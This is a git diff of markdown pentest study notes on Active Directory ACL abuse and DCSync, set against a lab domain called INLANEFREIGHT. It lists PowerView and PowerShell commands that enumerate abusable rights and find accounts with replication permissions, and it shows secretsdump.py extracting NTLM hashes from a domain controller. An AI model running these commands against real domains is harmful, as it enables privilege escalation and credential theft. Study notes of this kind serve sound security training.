@@ -4822,7 +4822,7 @@ The domain trust functions provide us with the tools we need to enumerate inform
 
 
 
-## Kerberoasting 
+### Kerberoasting 
 
 | Command | Description |
 | --- | --- |
@@ -4861,9 +4861,62 @@ The domain trust functions provide us with the tools we need to enumerate inform
 
 ### ACL Enumeration & Tactics 
 
+There are two types of ACLs 
+
+|ACL|Definition|
+|---|---|
+|`Discretionary Access Controls List (DACL)`| This defines which security principals are granted or denied access to an object|
+|`System Access Control Lists (SCAL)` | These allow administrators to log access attempts made to secured objects|
+
+ACL (mis)-configurations may allow for chained object-to-object control. We can visualize unrolled membership of target groups, so-called derivative admins, who can derive admin rights from exploiting an AD attack chain.
+
+AD Attack chains may include the following components:
+
+"Unprivileged" users (shadow admins) having administrative access on member servers or workstations.
+Privileged users having a logon session on these workstations and member servers.
+Other forms of object-to-object control include force password change, add group member, change owner, write ACE, and full control.
+
+ACL Abuse often goes unnoticed in corporate environments due to the difficulty surrounding both monitoring and controlling these permissions.  Some common examples are: 
+- ForceChangePassword abused with Set-DomainUserPassword
+- Add Members abused with Add-DomainGroupMember
+- GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember
+- GenericWrite abused with Set-DomainObject
+- WriteOwner abused with Set-DomainObjectOwner
+- WriteDACL abused with Add-DomainObjectACL
+- AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember
+
+| Step | Component                                                                                          | Description                                                                                          |
+|------|----------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------|
+|     |`(Get-ACL "AD:$((Get-ADUser daniel.carter).distinguishedname)").access  \| ? {$_.IdentityReference -eq "INLANEFREIGHT\cliff.moore"}`| Breakdowns the command below in steps |
+| 1    | `Get-ADUser daniel.carter`                                                                         | Retrieves the Active Directory user object for `daniel.carter`.                                     |
+| 2    | `.DistinguishedName`                                                                               | Extracts the full Distinguished Name (DN) of the user object.                                       |
+| 3    | `"AD:$((...))"`                                                                                    | Forms an ADsPath string that `Get-Acl` can use to locate the user object in AD.                    |
+| 4    | `Get-Acl "AD:$((...))"`                                                                            | Gets the Access Control List (ACL) for the specified AD object.                                     |
+| 5    | `.Access`                                                                                           | Retrieves the collection of Access Control Entries (ACEs) from the ACL.                             |
+| 6    | `? { $_.IdentityReference -eq "INLANEFREIGHT\cliff.moore" }`                                       | Filters the ACEs to include only those where the `IdentityReference` (the user or group the ACE applies to) matches `INLANEFREIGHT\cliff.moore`. |
+|      |`(Get-ACL "AD:$((Get-ADUser daniel.carter).distinguishedname)").access  \| ? {$_.ActiveDirectoryRights -match "WriteProperty" -or $_.ActiveDirectoryRights -match "GenericAll"} \| Select IdentityReference,ActiveDirectoryRights -Unique \| ft -W`| Get all Users with GenericAll or WriteProperty rights for user using built in cmdlets|
+
+Powershell one-liner using Powerview which finds all users or groups which have `GenericAll` rights over the `joe.evans` AD object and resolves SIDs 
+
+```
+Get-DomainObjectAcl -Identity joe.evans -ResolveGUIDs |
+    Where-Object { $_.ActiveDirectoryRights -match "GenericAll" } |
+    ForEach-Object {
+        [PSCustomObject]@{
+            Identity = ConvertFrom-SID $_.SecurityIdentifier
+            Rights   = $_.ActiveDirectoryRights
+        }
+    }
+
+```
+
 | Command                                                      | Description                                                  |
 | ------------------------------------------------------------ | ------------------------------------------------------------ |
 | `Find-InterestingDomainAcl`                                  | PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host. |
+|`(Get-ACL "AD:$((Get-ADUser daniel.carter).distinguishedname)").access  \| ? {$_.ActiveDirectoryRights -match "WriteProperty" -or $_.ActiveDirectoryRights -match "GenericAll"} \| Select IdentityReference,ActiveDirectoryRights -Unique \| ft -W`| Get all users which have the WriteProperty or GenericAll rights over the daniel.carter user using built in cmdlets|
+| `Get-DomainObjectAcl -Identity harry.jones -Domain inlanefreight.local -ResolveGUIDs`| Enumerate ACLs for Harry.jones using sharpview , returns similar results are above |
+| `Find-InterestingDomainAcl -Domain inlanefreight.local -ResolveGUIDs`| Returns objects in the domain with modification rights over non-built-in objects|
+| `Get-NetShare -ComputerName NAME` Followed by `Get-PathAcl "\\COMPUTERNAME\PATH"`| Get file shares and enumerate ACLs |
 | `Import-Module .\PowerView.ps1  $sid = Convert-NameToSid wley` | Used to import PowerView and retrieve the `SID` of a specific user account (`wley`) from a Windows-based host. |
 | `Get-DomainObjectACL -Identity * \| ? {$_.SecurityIdentifier -eq $sid}` | Used to find all Windows domain objects that the user has rights over by mapping the user's `SID` to the `SecurityIdentifier` property from a Windows-based host. |
 | `$guid= "00299570-246d-11d0-a768-00aa006e0529"   Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * \| Select Name,DisplayName,DistinguishedName,rightsGuid \| ?{$_.rightsGuid -eq $guid} \| fl` | Used to perform a reverse search & map to a `GUID` value from a Windows-based host. |
@@ -4886,8 +4939,17 @@ The domain trust functions provide us with the tools we need to enumerate inform
 
 ### DCSync 
 
+A DCSync attack allows an attacker to effectively impersonate a DC, allowing for the attacker to request account password data from the impersonated DC.
+The attack requires a user to be delegated a combination of the following three permissions: 
+- Replicating Directory Changes (DS-Replication-Get-Changes)
+- Replicating Directory Changes All (DS-Replication-Get-Changes-All)
+- Replicating Directory Changes In Filtered Set (DS-Replication-Get-Changes-In-Filtered-Set)
+
+
 | Command                                                      | Description                                                  |
 | ------------------------------------------------------------ | ------------------------------------------------------------ |
+| `$dcsync = Get-ObjectACL "DC=inlanefreight,DC=local" -ResolveGUIDs \| ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} \| Select-Object -ExpandProperty SecurityIdentifier \| Select -ExpandProperty value `| Find all users who have the necessary rights|
+| `Convert-SidToName $dcsync`| Convert output from previous command to usernames|
 | `Get-DomainUser -Identity adunn  \| select samaccountname,objectsid,memberof,useraccountcontrol \|fl` | PowerView tool used to view the group membership of a specific user (`adunn`) in a target Windows domain. Performed from a Windows-based host. |
 | `$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs \| ? { ($_.ObjectAceType -match 'Replication-Get')} \| ?{$_.SecurityIdentifier -match $sid} \| select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType \| fl` | Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool `Get-ObjectAcl` to check a specific user's replication rights. Performed from a Windows-based host. |
 | `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss` | Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (`172.16.5.5`) and save the extracted hashes to an file (`inlanefreight_hashes`). Performed from a Linux-based host. |
